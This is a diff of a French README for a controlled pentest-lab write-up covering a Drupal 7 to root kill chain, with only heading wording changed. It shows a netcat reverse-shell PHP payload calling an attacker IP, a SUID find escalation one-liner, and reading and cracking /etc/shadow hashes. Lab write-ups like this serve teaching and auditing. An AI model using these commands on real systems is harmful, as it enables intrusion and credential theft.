@@ -1,4 +1,4 @@
-# Pentest Lab : Chaîne d'Exploitation Web & Système (Drupal to Root)
+# Pentest Lab : Chaîne d'exploitation web et système (Drupal to Root)
 
 ![Root Proof](preuves/06_root_proof.png)
 
@@ -8,7 +8,7 @@ Ce projet a été réalisé dans un **environnement de laboratoire contrôlé et
 
 ---
 
-## Environnement de Travail & Objectifs
+## Environnement de travail et objectifs
 
 ### Le Scénario
 L'objectif de ce projet est de réaliser un **audit en boîte noire (Black Box)**. Cela signifie que l'analyse démarre sans aucune connaissance préalable de la cible : aucun identifiant, aucune documentation technique, ni code source n'a été fourni.
@@ -24,7 +24,7 @@ L'infrastructure a été déployée virtuellement sous **VMware** dans un résea
 
 ---
 
-## Phase 1 : Reconnaissance & Repérage
+## Phase 1 : Reconnaissance et repérage
 
 La première étape a consisté à cartographier la surface d'attaque de la machine cible à l'aide d'un scan de ports.
 
@@ -41,7 +41,7 @@ L'analyse du service Web (Port 80) et du fichier `robots.txt` a révélé la pr�
 
 ---
 
-## Analyse des Vulnérabilités
+## Analyse des vulnérabilités
 
 Les résultats de la phase de reconnaissance ont mis en évidence une surface d'attaque critique : un CMS **Drupal 7** non maintenu. Cette version est historiquement connue pour être vulnérable à des failles de sécurité majeures (notamment "Drupalgeddon").
 
@@ -56,26 +56,26 @@ Face à ce constat, l'audit s'est orienté vers une recherche ciblée de vulnér
 
 ## Exploitation (Kill Chain)
 
-### Étape 1 : Intrusion Initiale (SQL Injection)
+### Étape 1 : Intrusion initiale (SQL Injection)
 Exploitation de la faille **CVE-2014-3704 (Drupalgeddon)**. Cette vulnérabilité dans l'API de base de données de Drupal permet d'injecter des commandes SQL sans authentification.
 * **Action :** Injection d'un nouvel utilisateur dans la table `users` avec les droits Administrateur.
 * **Résultat :** Accès au panneau d'administration du CMS.
 
 ![Exploit SQLi](preuves/04_sqli_exploit.png)
 
-### Étape 2 : Exécution de Code (RCE & Reverse Shell)
+### Étape 2 : Exécution de code (RCE & Reverse Shell)
 Une fois connecté en tant qu'administrateur, utilisation du module natif **PHP Filter**. Ce module, mal configuré, permet d'exécuter du code PHP arbitraire dans les pages du site.
 * **Payload :** `<?php system('nc -e /bin/bash 192.168.78.131 4444'); ?>`
 * **Résultat :** Obtention d'un shell distant sur la machine Kali (utilisateur `www-data`).
 
 ![Reverse Shell](preuves/05_reverse_shell.png)
 
-### Étape 3 : Escalade de Privilèges (Vers Root)
+### Étape 3 : Escalade de privilèges (Vers Root)
 Analyse des fichiers disposant de la permission **SUID** (Set User ID). Découverte d'une configuration critique sur la commande `find`.
 * **Commande d'escalade :** `find . -exec '/bin/sh' \;`
 * **Résultat :** Le binaire `find` s'exécute en root, lançant un shell avec les privilèges **Root (uid=0)**.
 
-## Étape 4 : Post-Exploitation 
+## Étape 4 : Post-exploitation 
 Une fois l'accès root obtenu, lecture du fichier sensible `/etc/shadow` pour exfiltrer les empreintes (hashs) des mots de passe utilisateurs.
 * **Action :** Utilisation de **John the Ripper** pour casser les hashs SHA-512 par attaque dictionnaire.
 * **Résultat :** Récupération du mot de passe root/utilisateur (faible complexité), permettant une persistance sur le système.
